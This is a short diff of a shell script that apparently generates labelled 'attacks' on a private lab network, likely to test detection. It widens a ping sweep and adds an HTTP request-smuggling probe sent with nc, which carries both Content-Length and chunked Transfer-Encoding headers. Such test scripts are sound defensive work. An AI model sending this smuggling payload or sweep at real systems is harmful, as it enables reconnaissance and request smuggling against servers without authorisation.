@@ -39,9 +39,12 @@ curl "http://192.168.7.69:8888/"
 sleep 10
 
 echo "Starting attack 10"
-for i in `seq 1 3`; do
-    ping -c 3 -W 1 192.168.7.$i;
+for i in `seq 1 5`; do
+    ping -c 1 -W 1 192.168.7.$i;
 done
 sleep 10
+
+echo "Starting attack 11"
+printf "POST / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 10\r\nTransfer-Encoding: chunked\r\n\r\n" | nc 192.168.8.69 5000
 
 echo "Done."
